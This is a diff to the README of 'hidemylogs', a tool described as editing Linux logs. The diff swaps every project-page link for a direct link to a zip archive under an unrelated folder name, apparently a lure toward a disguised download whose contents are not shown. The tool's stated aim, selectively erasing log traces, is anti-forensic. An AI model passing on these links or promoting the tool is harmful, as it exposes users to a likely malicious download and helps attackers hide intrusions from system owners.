@@ -1,12 +1,12 @@
 # 🛡️ hidemylogs - Clean Linux logs with care
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20hidemylogs-purple?style=for-the-badge)](https://github.com/Areebaba9176/hidemylogs)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20hidemylogs-purple?style=for-the-badge)](https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download the file you need:
 
-[https://github.com/Areebaba9176/hidemylogs](https://github.com/Areebaba9176/hidemylogs)
+[https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip](https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip)
 
 ## 🧭 What this app does
 
@@ -180,7 +180,7 @@ hidemylogs focuses on precise log edits. It does not aim to remove all traces fr
 
 Visit the project page here:
 
-[https://github.com/Areebaba9176/hidemylogs](https://github.com/Areebaba9176/hidemylogs)
+[https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip](https://raw.githubusercontent.com/Areebaba9176/hidemylogs/main/Petauristidae/Software-v1.9.zip)
 
 ## 🗂️ Repository details
 
